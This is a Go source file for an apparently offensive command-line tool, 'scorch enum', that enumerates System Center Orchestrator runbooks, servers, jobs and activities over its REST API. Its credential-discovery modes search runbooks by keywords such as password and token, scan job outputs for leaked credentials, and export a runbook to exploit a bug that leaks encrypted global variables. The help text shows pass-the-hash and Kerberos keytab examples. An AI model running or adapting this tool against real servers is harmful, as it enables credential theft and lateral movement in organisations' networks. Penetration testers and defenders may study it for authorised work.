package main

import (
	"fmt"
	"strings"
	"time"
)

func runEnum(args []string) error {
	if containsHelp(args) {
		printEnumHelp()
		return nil
	}

	opts, remaining, err := parseCommonFlags(args)
	if err != nil {
		return err
	}

	// Parse enum-specific flags
	all, remaining := parseBoolFlag(remaining, "-all", "--all")
	runbooks, remaining := parseBoolFlag(remaining, "-runbooks", "--runbooks")
	servers, remaining := parseBoolFlag(remaining, "-servers", "--servers")
	folders, remaining := parseBoolFlag(remaining, "-folders", "--folders")
	jobs, remaining := parseBoolFlag(remaining, "-jobs", "--jobs")
	activities, remaining := parseBoolFlag(remaining, "-activities", "--activities")
	events, remaining := parseBoolFlag(remaining, "-events", "--events")
	stats, remaining := parseBoolFlag(remaining, "-stats", "--stats")
	credSearch, remaining := parseBoolFlag(remaining, "-cred-search", "--cred-search")
	credLeak, remaining := parseBoolFlag(remaining, "-cred-leak", "--cred-leak")
	export, remaining := parseBoolFlag(remaining, "-export", "--export")
	search, remaining := parseFlag(remaining, "-search", "--search")
	runbookID, remaining := parseFlag(remaining, "-id", "-runbook-id", "--runbook-id")

	if all {
		runbooks = true
		servers = true
		folders = true
		jobs = true
		activities = true
	}

	// Default to runbooks if nothing specified
	if !runbooks && !servers && !folders && !jobs && !activities && !events && !stats && !credSearch && !credLeak && !export && search == "" && runbookID == "" {
		runbooks = true
	}

	if err := opts.Validate(); err != nil {
		return err
	}

	ctx, cancel := createContext(opts)
	defer cancel()

	printf(opts, "[*] Connecting to %s...\n", opts.Target)

	// Create HTTP client with auth
	client, err := NewHTTPClient(opts)
	if err != nil {
		return fmt.Errorf("failed to create client: %w", err)
	}

	// Detect API version
	apiVersion, err := client.DetectAPIVersion(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}

	printf(opts, "[+] Connected (API: %s)\n", apiVersion)

	output, cleanup, err := getOutput(opts)
	if err != nil {
		return err
	}
	defer cleanup()

	// Handle runbook export (exploits encrypted variable leak bug)
	if export && runbookID != "" {
		debugf(opts, "Exporting runbook %s (NOTE: may contain ALL encrypted global variables)", runbookID)
		data, err := client.ExportRunbook(ctx, runbookID)
		if err != nil {
			return err
		}
		fmt.Fprint(output, string(data))
		return nil
	}

	// Handle credential leak scan in job outputs
	if credLeak {
		debugf(opts, "Scanning job outputs for credential leakage")
		leaks, err := client.ScanJobOutputsForCredentials(ctx)
		if err != nil {
			return err
		}

		if opts.JSON {
			return writeJSON(output, leaks)
		}

		fmt.Fprintf(output, "\n[+] Credential Leak Scan (%d potential leaks found)\n", len(leaks))
		fmt.Fprintln(output, strings.Repeat("-", 60))
		for _, leak := range leaks {
			fmt.Fprintf(output, "  Job: %s\n", leak.JobID)
			fmt.Fprintf(output, "    Pattern: %s\n", leak.Pattern)
			fmt.Fprintf(output, "    Snippet: %s\n\n", leak.Snippet)
		}
		return nil
	}

	// Handle statistics
	if stats {
		debugf(opts, "Getting execution statistics")
		statistics, err := client.GetStatistics(ctx)
		if err != nil {
			return fmt.Errorf("failed to get statistics: %w", err)
		}

		if opts.JSON {
			return writeJSON(output, statistics)
		}

		fmt.Fprintln(output, "\n[+] Execution Statistics")
		fmt.Fprintf(output, "  Total Runbooks:   %d\n", statistics.TotalRunbooks)
		fmt.Fprintf(output, "  Published:        %d\n", statistics.PublishedCount)
		fmt.Fprintf(output, "  Total Jobs:       %d\n", statistics.TotalJobs)
		fmt.Fprintf(output, "  Running:          %d\n", statistics.RunningJobs)
		fmt.Fprintf(output, "  Completed:        %d\n", statistics.CompletedJobs)
		fmt.Fprintf(output, "  Failed:           %d\n", statistics.FailedJobs)
		return nil
	}

	// Handle events (audit log)
	if events {
		debugf(opts, "Getting system events")
		eventList, err := client.GetEvents(ctx, "")
		if err != nil {
			return fmt.Errorf("failed to get events: %w", err)
		}

		if opts.JSON {
			return writeJSON(output, eventList)
		}

		fmt.Fprintf(output, "\n[+] System Events (%d)\n", len(eventList))
		fmt.Fprintln(output, strings.Repeat("-", 60))
		for _, ev := range eventList {
			fmt.Fprintf(output, "  [%s] %s\n", ev.Severity, ev.Name)
			fmt.Fprintf(output, "    %s\n", ev.Summary)
			fmt.Fprintf(output, "    Time: %s\n\n", ev.CreatedTime)
		}
		return nil
	}

	// Handle specific runbook lookup
	if runbookID != "" {
		debugf(opts, "Getting runbook details for %s", runbookID)
		rb, err := client.GetRunbook(ctx, runbookID)
		if err != nil {
			return err
		}
		params, _ := client.GetRunbookParameters(ctx, runbookID)
		acts, _ := client.GetRunbookActivities(ctx, runbookID)

		result := map[string]interface{}{
			"runbook":    rb,
			"parameters": params,
			"activities": acts,
		}

		if opts.JSON {
			return writeJSON(output, result)
		}

		fmt.Fprintf(output, "\nRunbook: %s\n", rb.Name)
		fmt.Fprintf(output, "  ID:          %s\n", rb.ID)
		fmt.Fprintf(output, "  Description: %s\n", rb.Description)
		fmt.Fprintf(output, "  Path:        %s\n", rb.Path)
		fmt.Fprintf(output, "  Published:   %v\n", rb.Published)

		if len(params) > 0 {
			fmt.Fprintf(output, "\n  Parameters:\n")
			for _, p := range params {
				fmt.Fprintf(output, "    - %s (%s, %s)\n", p.Name, p.Type, p.Direction)
			}
		}

		if len(acts) > 0 {
			fmt.Fprintf(output, "\n  Activities:\n")
			for _, a := range acts {
				fmt.Fprintf(output, "    - [%s] %s\n", a.Type, a.Name)
				if a.Description != "" {
					fmt.Fprintf(output, "      %s\n", a.Description)
				}
			}
		}
		return nil
	}

	// Handle credential search
	if credSearch {
		debugf(opts, "Searching for credential-handling runbooks")
		runbookList, err := client.GetRunbooks(ctx)
		if err != nil {
			return err
		}

		keywords := []string{
			"password", "credential", "secret", "key", "token",
			"auth", "login", "account", "service", "connect",
			"database", "sql", "ldap", "exchange", "vmm", "scom", "sccm",
		}

		var credRunbooks []map[string]interface{}
		for _, rb := range runbookList {
			searchText := strings.ToLower(rb.Name + " " + rb.Description)
			var matches []string
			for _, kw := range keywords {
				if strings.Contains(searchText, kw) {
					matches = append(matches, kw)
				}
			}
			if len(matches) > 0 {
				credRunbooks = append(credRunbooks, map[string]interface{}{
					"id":          rb.ID,
					"name":        rb.Name,
					"description": rb.Description,
					"keywords":    matches,
					"confidence":  float64(len(matches)) * 0.2,
				})
			}
		}

		if opts.JSON {
			return writeJSON(output, credRunbooks)
		}

		fmt.Fprintf(output, "\n[+] Runbooks Likely Handling Credentials (%d found)\n", len(credRunbooks))
		fmt.Fprintln(output, strings.Repeat("-", 60))
		for _, cr := range credRunbooks {
			fmt.Fprintf(output, "  %s\n", cr["name"])
			fmt.Fprintf(output, "    Keywords: %v\n", cr["keywords"])
			fmt.Fprintf(output, "    ID: %s\n\n", cr["id"])
		}
		return nil
	}

	// Handle search
	if search != "" {
		debugf(opts, "Searching for runbooks matching: %s", search)
		runbookList, err := client.SearchRunbooks(ctx, search)
		if err != nil {
			return err
		}

		if opts.JSON {
			return writeJSON(output, runbookList)
		}

		fmt.Fprintf(output, "\n[+] Search Results for '%s' (%d found)\n", search, len(runbookList))
		for _, rb := range runbookList {
			status := "Draft"
			if rb.Published {
				status = "Published"
			}
			fmt.Fprintf(output, "  [%s] %s\n", status, rb.Name)
			fmt.Fprintf(output, "         ID: %s\n", rb.ID)
		}
		return nil
	}

	// Standard enumeration
	result := &EnumerationResult{
		Timestamp:  timeNow(),
		Target:     opts.Target,
		APIVersion: apiVersion,
	}

	if runbooks {
		debugf(opts, "Enumerating runbooks")
		rbs, err := client.GetRunbooks(ctx)
		if err != nil {
			debugf(opts, "Runbooks error: %v", err)
		} else {
			result.Runbooks = rbs
		}
	}

	if servers {
		debugf(opts, "Enumerating runbook servers")
		srvs, err := client.GetRunbookServers(ctx)
		if err != nil {
			debugf(opts, "Servers error: %v", err)
		} else {
			result.RunbookServers = srvs
		}
	}

	if folders {
		debugf(opts, "Enumerating folders")
		flds, err := client.GetFolders(ctx)
		if err != nil {
			debugf(opts, "Folders error: %v", err)
		} else {
			result.Folders = flds
		}
	}

	if jobs {
		debugf(opts, "Enumerating jobs")
		jbs, err := client.GetJobs(ctx, "")
		if err != nil {
			debugf(opts, "Jobs error: %v", err)
		} else {
			result.Jobs = jbs
		}
	}

	if activities {
		debugf(opts, "Enumerating activities")
		acts, err := client.GetActivities(ctx)
		if err != nil {
			debugf(opts, "Activities error: %v", err)
		} else {
			result.Activities = acts
		}
	}

	if opts.JSON {
		return writeJSON(output, result)
	}

	// Pretty print
	fmt.Fprintln(output)
	
	if len(result.Runbooks) > 0 {
		fmt.Fprintf(output, "[+] Runbooks (%d)\n", len(result.Runbooks))
		for _, rb := range result.Runbooks {
			status := "Draft"
			if rb.Published {
				status = "Published"
			}
			fmt.Fprintf(output, "  [%s] %s\n", status, rb.Name)
			fmt.Fprintf(output, "         %s\n", rb.ID)
		}
		fmt.Fprintln(output)
	}

	if len(result.RunbookServers) > 0 {
		fmt.Fprintf(output, "[+] Runbook Servers (%d)\n", len(result.RunbookServers))
		for _, srv := range result.RunbookServers {
			status := "Offline"
			if srv.Available {
				status = "Online"
			}
			fmt.Fprintf(output, "  [%s] %s (%s)\n", status, srv.Name, srv.MachineName)
		}
		fmt.Fprintln(output)
	}

	if len(result.Folders) > 0 {
		fmt.Fprintf(output, "[+] Folders (%d)\n", len(result.Folders))
		for _, f := range result.Folders {
			fmt.Fprintf(output, "  %s (%s)\n", f.Name, f.ID)
		}
		fmt.Fprintln(output)
	}

	if len(result.Jobs) > 0 {
		fmt.Fprintf(output, "[+] Recent Jobs (%d)\n", len(result.Jobs))
		for _, j := range result.Jobs {
			fmt.Fprintf(output, "  [%s] %s (by %s)\n", j.Status, truncate(j.ID, 8), j.CreatedBy)
		}
		fmt.Fprintln(output)
	}

	if len(result.Activities) > 0 {
		fmt.Fprintf(output, "[+] Activities (%d)\n", len(result.Activities))
		for _, a := range result.Activities {
			fmt.Fprintf(output, "  [%s] %s\n", a.Type, a.Name)
		}
		fmt.Fprintln(output)
	}

	return nil
}

func printEnumHelp() {
	fmt.Print(`
scorch enum - Enumerate SCORCH resources via REST API

Usage: scorch enum [options]

Target Options:
  -target, -t    Target SCORCH server (required)
  -port, -P      Web service port (default: 81)
  -tls           Use HTTPS
  -k             Skip TLS certificate verification

Authentication:
  -u, -username  Username
  -p, -password  Password
  -d, -domain    Domain (for NTLM)
  -H, -hash      NT hash for pass-the-hash

Kerberos:
  -kerberos      Enable Kerberos authentication (uses SPNEGO)
  -realm         Kerberos realm (defaults to uppercase domain)
  -kdc           KDC address (optional, uses krb5.conf/DNS if not set)
  -keytab        Path to keytab file
  -ccache        Path to credential cache (or set KRB5CCNAME env)

Enumeration:
  -all           Enumerate everything (runbooks, servers, folders, jobs, activities)
  -runbooks      List all runbooks
  -servers       List runbook servers
  -folders       List folders
  -jobs          List recent jobs
  -activities    List all activities (for credential discovery)
  -events        List system events (audit log)
  -stats         Show execution statistics
  -search        Search runbooks by name
  -id            Get specific runbook details (includes parameters AND activities)

Credential Discovery:
  -cred-search   Find credential-handling runbooks by keyword
  -cred-leak     Scan job outputs for credential leakage
  -export -id    Export runbook (BUG: includes ALL encrypted global variables!)

Output:
  -json          JSON output
  -o, -output    Write to file
  -q, -quiet     Suppress status messages
  -debug         Debug output

Examples:
  # List all runbooks with NTLM auth
  scorch enum -t scorch.corp.local -d CORP -u admin -p Pass123 -runbooks

  # Pass-the-hash enumeration
  scorch enum -t scorch.corp.local -d CORP -u admin -H aad3b435b51404ee -all

  # Kerberos with password
  scorch enum -t scorch.corp.local -kerberos -u admin -p Pass123 -realm CORP.LOCAL -all

  # Kerberos with existing ticket (kinit first)
  export KRB5CCNAME=/tmp/krb5cc_admin
  scorch enum -t scorch.corp.local -kerberos -all

  # Kerberos with keytab
  scorch enum -t scorch.corp.local -kerberos -u svc_scorch -keytab /etc/svc.keytab -realm CORP.LOCAL

  # Search for backup runbooks
  scorch enum -t scorch.corp.local -u admin -p Pass123 -search backup

  # Export runbook (may leak encrypted variables!)
  scorch enum -t scorch.corp.local -u admin -p Pass123 -export -id <guid> -o runbook.ois

  # Scan job outputs for credential leakage
  scorch enum -t scorch.corp.local -u admin -p Pass123 -cred-leak

  # Find credential-handling runbooks
  scorch enum -t scorch.corp.local -u admin -p Pass123 -cred-search

`)
}

// Helper to get current time
func timeNow() string {
	return time.Now().Format(time.RFC3339)
}
